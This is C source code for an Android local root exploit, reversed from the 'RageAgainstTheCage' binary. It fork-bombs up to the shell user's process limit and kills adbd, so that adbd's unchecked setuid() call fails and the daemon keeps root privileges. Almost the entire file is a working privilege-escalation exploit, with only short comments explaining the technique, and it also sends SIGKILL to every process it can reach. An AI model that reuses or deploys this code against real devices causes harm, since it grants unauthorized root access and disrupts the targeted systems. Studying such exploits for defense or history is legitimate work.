/*
 * Reversed from rageagainstthecage-arm5.bin release by Sebastian Krahmer/743C
 * Local root exploit for Android
 * Anthony Lineberry
 *
 * This exploit will fork off proccesseses (as shell user) until the RLIMIT_NPROC max is
 * hit. At that point fork() will start failing. At this point the original parent
 * process will kill the adb process, causing it to restart. When adb starts, it
 * runs as root, and then drops its privs with setuid():
 *
 *
 * setuid() will decrement the root process count, and increment the shell user
 * proccess count. Since the shell user has hit the RLIMIT_NPROC max, this will
 * cause setuid() to fail. Since the adb code above doesn't check the retval of
 * setuid(), adb will still be running as root.
 *
 */
 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <errno.h>
#include <signal.h>
#include <pwd.h>

 
void die(char *s) 
{
  perror(s);
  exit(errno);
}
 
pid_t get_adb(void) 
{
  char path[256];
  pid_t pid = 0;
  int fd;
  int tmpPID = 0;
  
  while(pid < 32000) 
  {
	pid++;
	tmpPID++;
	
	//Get commandline path from process
    sprintf(path, "/proc/%d/cmdline", pid);
    
	//Open commandlinePath
	if(fd = open(path, O_RDONLY) < 0) 
	{
		//printf("[-] no adb:%d\n",tmpPID);
		continue;
    }
	else
	{
		//printf("[-] PATH:%s\n",path);
	}
		
	//Read out the commandline link to the executabel and hope it is sbin/adbd
	char pathADBD[128];
	FILE* output1;
	output1 = fopen(path, "r");
	fscanf(output1, "%s", &pathADBD);
	fclose(output1);
	
	//if(tmpPID == 57)return pid;
	//Checking the result
    if(strstr(pathADBD, "/sbin/adbd") != 0) 
	{
	  printf("[-] PATH:%s\n",pathADBD);
      return pid;
    }
	else
	{
		//printf("[-] no adb:%d\n",tmpPID);
		continue;
    }
  }

  return 0;
}
 
void kill_adb(pid_t pid) 
{
  while(1) 
  {
    pid_t adb_pid = get_adb();
    
	if(adb_pid == pid || adb_pid == 0) 
	{
      sleep(1);
      continue;
    }
	
	printf("[+] kill ADBD");
    //sleep(5);
    kill(-1, SIGKILL);
  }
}
 
int main() 
{
  struct rlimit s_rlimit = {0};
  pid_t adb_pid;
  pid_t pid;
  pid_t pid2;
  char num_children = 0;
  int fd;
  int pfd[2];
  
  //Set me as shell user.
  setgid(2000);
  setuid(2000);
 
  struct passwd *pw_entry;
  pw_entry = getpwuid(geteuid());
  if (pw_entry == NULL) exit(1);
  printf("[*] %s\n", pw_entry->pw_name);
  printf("%d", getpid());
 
  //Get max allowed process count
  if(getrlimit(RLIMIT_NPROC, &s_rlimit) < 0) 
  {
    die("[-] getrlimit");
  }
  printf("[+] RLIMIT_NPROC={%lu, %lu}\n", s_rlimit.rlim_cur, s_rlimit.rlim_max);
  //Check max.
  if(s_rlimit.rlim_max == -1) 
  {
    puts("[-] No RLIMIT_NPROC set. Exploit would just crash machine. Exiting");
    exit(1);
  }

  //Find ADB Process
  puts("[*] Searching for adb ...");
  if((adb_pid = get_adb()) == 0) 
  {
    die("[-] Cannot find adb");
  }
  printf("[+] Found adb as PID %d\n", adb_pid);
  puts("[*] Spawning childing. Dont type anything and wait for reset! \n");
  puts("[*]\n[*] adb connection will be reset. restart adb server on desktop.\n");
  sleep(2);
  
  // Fork processes, kill parent, and make sure child gets its own session ID
  //The fork function creates a new process. If the operation is successful, there are then both parent and child processes and both see fork return, but with different values: it returns a value of 0 in the child process and returns the child's process ID in the parent process.
  if(fork() > 0) 
  {
	printf("[+] [-] Couldnt create new Process");
	exit(1);
  }
  //The setsid function creates a new session.  The calling process is the session leader of the new session, is the process group leader of a new process group and has no controlling terminal.
  setsid();
  //This creates both the reading and writing ends of the pipe.
  pipe(pfd);
  pid = fork();
  
  if(pid != 0) 
  { 
	printf("[+] PID is a Parent!\n");
	/* parent */
    // close write pipe
    close(pfd[1]);
 
    // blocks on pipe read until max proccesses have be forked
    read(pfd[0], &num_children, 1);
    kill(adb_pid, SIGKILL);
    if(fork() != 0) 
	{
      /* parent kills adb? */
      kill_adb(adb_pid);
    }
 
    fork();
  } 
  else 
  { 
	printf("[+] PID is a Child!\n");
	/* child */
    // close read pipe
    close(pfd[0]);
 
    // fork till we can fork no more, exit children
    int write_to_pipe = 1;
    while(1) 
	{
      // fork till we hit the RLIMIT_NOPROC max and fail
      while((pid2 = fork()) >= 0) 
	  {
        if(pid2 == 0) 
		{
		  printf("%d", getpid());
          exit(0);
        }
        num_children++;
      }
 
      // This will unblock the parents pipe read so that it can now kill adbd
      if(write_to_pipe) 
	  {
        printf("\n[+] Forked %d childs.\n", num_children);
        write(pfd[1], &num_children, sizeof(num_children));
        close(pfd[1]);
      }
      write_to_pipe = 0;
      // after this we just keep on forking again...
    }
  }
  
  die("[+] END REACHED");
}